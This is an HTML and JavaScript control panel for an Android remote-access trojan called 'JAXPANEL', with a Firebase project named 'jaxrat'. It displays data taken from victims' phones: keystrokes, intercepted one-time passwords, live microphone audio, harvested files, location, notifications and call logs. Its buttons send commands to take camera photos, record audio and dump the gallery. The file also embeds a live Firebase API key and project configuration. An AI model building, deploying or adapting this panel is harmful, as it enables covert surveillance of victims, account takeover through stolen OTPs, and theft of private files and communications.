<!DOCTYPE html>
<html>
<head>
    <title>📱 Device Detail - JAXPANEL [PREMIUM]</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
            authDomain: "jaxrat-6813c.firebaseapp.com",
            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
            projectId: "jaxrat-6813c",
            storageBucket: "jaxrat-6813c.firebasestorage.app",
            messagingSenderId: "750985295231",
            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
        };
        firebase.initializeApp(firebaseConfig);
    </script>
    <style>
        body { background: #0a0e2a; color: white; font-family: 'Courier New'; margin: 0; padding: 20px; }
        .header { background: #151e3d; padding: 15px; border: 1px solid #00ffaa; border-radius: 5px; margin-bottom: 20px; }
        .tab { overflow: hidden; border-bottom: 2px solid #00ffaa; margin-bottom: 10px; }
        .tab button { background: #1e2745; color: #00ffaa; float: left; border: none; outline: none; cursor: pointer; padding: 12px 20px; font-weight: bold; transition: 0.3s; }
        .tab button:hover { background: #2e3a60; }
        .tab button.active { background: #00ffaa; color: black; }
        .tabcontent { display: none; padding: 20px; background: #151e3d; border: 1px solid #333; min-height: 400px; border-radius: 0 0 5px 5px; overflow-y: auto; }
        pre { background: #000; padding: 10px; border: 1px solid #00ffaa; color: #00ffaa; overflow-x: auto; white-space: pre-wrap; font-size: 12px; }
        .btn-cmd { padding: 10px 20px; background: transparent; border: 1px solid #00ffaa; color: #00ffaa; cursor: pointer; margin: 5px; font-weight: bold; }
        .btn-cmd:hover { background: #00ffaa; color: black; }
        .log-box { height: 350px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #333; }
        .audio-card { background: #2a1b0a; border: 1px solid #ff4500; padding: 15px; border-radius: 5px; margin-top: 10px; text-align: center; }
    </style>
</head>
<body>
    <div class="header" id="deviceInfo">Loading Device Information...</div>

    <div class="tab">
        <button class="tablinks active" onclick="openTab(event, 'Surveillance')">📡 Live Monitor</button>
        <button class="tablinks" onclick="openTab(event, 'Location')">📍 Lokasi</button>
        <button class="tablinks" onclick="openTab(event, 'Storage')">📁 Files</button>
        <button class="tablinks" onclick="openTab(event, 'Notif')">🔔 Notif</button>
        <button class="tablinks" onclick="openTab(event, 'Logs')">📞 Logs</button>
        <button class="tablinks" onclick="openTab(event, 'Commands')">⚙️ Controls</button>
    </div>

    <div id="Surveillance" class="tabcontent" style="display:block;">
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
            <div>
                <h3>⌨️ KEYLOGGER</h3>
                <div id="keyloggerData" class="log-box" style="border-color: #00ffaa;"></div>
            </div>
            <div>
                <h3 style="color: #ff00ff;">📟 OTP INTERCEPTOR</h3>
                <div id="otpBox" class="log-box" style="border-color: #ff00ff;"></div>
            </div>
        </div>
        
        <div class="audio-card">
            <h3 style="color: #ff4500; margin-top: 0;">🎙️ LIVE AUDIO FEED</h3>
            <audio id="audioPlayer" controls style="width: 100%;"></audio>
            <p id="audioTime" style="font-size: 10px; color: #888; margin-top: 5px;">No recording received.</p>
        </div>
    </div>

    <div id="Storage" class="tabcontent">
        <h3>📁 HARVESTED FILES</h3>
        <div id="fileList">Menunggu file dump...</div>
    </div>

    <div id="Location" class="tabcontent"><div id="locationData"></div></div>
    <div id="Notif" class="tabcontent"><div id="notifList"></div></div>
    <div id="Logs" class="tabcontent"><div id="logsData"></div></div>

    <div id="Commands" class="tabcontent">
        <h3>⚙️ REMOTE CONTROLS</h3>
        <div style="border: 1px solid #444; padding: 15px; border-radius: 5px;">
            <p>SENSORY ACTIONS:</p>
            <button class="btn-cmd" onclick="quickCmd('snap_front')">📷 Snap Front</button>
            <button class="btn-cmd" onclick="quickCmd('snap_back')">📸 Snap Back</button>
            <button class="btn-cmd" style="border-color: #ff4500;" onclick="quickCmd('record_30s')">🎙️ Record 30s</button>
            <button class="btn-cmd" style="border-color: #ffd700;" onclick="quickCmd('dump_gallery')">📁 Dump Gallery</button>
        </div>
        <div style="margin-top: 20px;">
            <p>SYSTEM ACTIONS:</p>
            <button class="btn-cmd" onclick="quickCmd('vibrate')">📳 Vibrate</button>
            <button class="btn-cmd" onclick="quickCmd('location')">📍 Get GPS</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('id');

        // 1. DEVICE INFO
        firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
            const d = snap.val();
            document.getElementById('deviceInfo').innerHTML = `<h2 style="margin:0; color:#00ffaa;">📟 ${d?.model || 'Target'}</h2><p>Status: Online | Batt: ${d?.battery}%</p>`;
        });

        // 2. AUDIO LISTENER
        firebase.database().ref(`live/audio/${deviceId}`).on('value', snap => {
            if (snap.val()) {
                document.getElementById('audioPlayer').src = "data:audio/mp3;base64," + snap.val();
                document.getElementById('audioTime').innerText = "Last Received: " + new Date().toLocaleTimeString();
            }
        });

        // 3. FILE LISTENER
        firebase.database().ref(`storage/${deviceId}`).on('child_added', snap => {
            const fileName = snap.key;
            const fileData = snap.val();
            const list = document.getElementById('fileList');
            if(list.innerText.includes("Menunggu")) list.innerHTML = "";
            
            list.innerHTML += `
                <div style="background:#1e2745; padding:10px; border:1px solid #333; margin-bottom:5px;">
                    📄 ${fileName} 
                    <a href="data:application/octet-stream;base64,${fileData}" download="${fileName}" style="color:#00ffaa; float:right;">DOWNLOAD</a>
                </div>`;
        });

        // 4. KEYLOGGER & OTP (REUSE PREVIOUS LOGIC)
        firebase.database().ref(`logs/keylogger/${deviceId}`).limitToLast(10).on('value', snap => {
            let h = ''; snap.forEach(c => { h += `<div>[${c.val().app}]: ${c.val().content}</div>`; });
            document.getElementById('keyloggerData').innerHTML = h;
        });

        firebase.database().ref(`logs/otp/${deviceId}`).on('child_added', snap => {
            const d = snap.val();
            document.getElementById('otpBox').innerHTML = `<div style="color:#ff00ff;">[${d.sender}]: ${d.content}</div>` + document.getElementById('otpBox').innerHTML;
        });

        // NAVIGATION
        function openTab(evt, name) {
            document.querySelectorAll('.tabcontent').forEach(x => x.style.display = 'none');
            document.querySelectorAll('.tablinks').forEach(x => x.classList.remove('active'));
            document.getElementById(name).style.display = 'block';
            evt.currentTarget.className += " active";
        }

        function quickCmd(action) {
            firebase.database().ref(`commands/${deviceId}`).set({ cmd: action, time: Date.now() });
            alert("Sent: " + action);
        }
    </script>
</body>
</html>
